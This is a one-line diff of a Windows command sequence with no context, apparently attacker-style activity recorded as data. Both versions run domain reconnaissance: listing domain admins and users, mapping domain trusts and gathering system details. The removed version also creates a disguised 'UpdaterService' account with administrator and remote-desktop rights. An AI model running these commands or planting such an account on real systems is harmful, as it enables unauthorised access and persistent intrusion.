@@ -1,1 +1,1 @@
-net group "domain admins" /dom; net group “domain users” /dom; nltest /domain_trusts /all_trusts; ipconfig /all; systeminfo; New-LocalUser "UpdaterService"; Add-LocalGroupMember -Group "Administrators" -Member "UpdaterService"; Add-LocalGroupMember -Group "Remote Desktop Users" -Member "UpdaterService"
+net group "domain admins" /dom; net group “domain users” /dom; nltest /domain_trusts /all_trusts; ipconfig /all; systeminfo
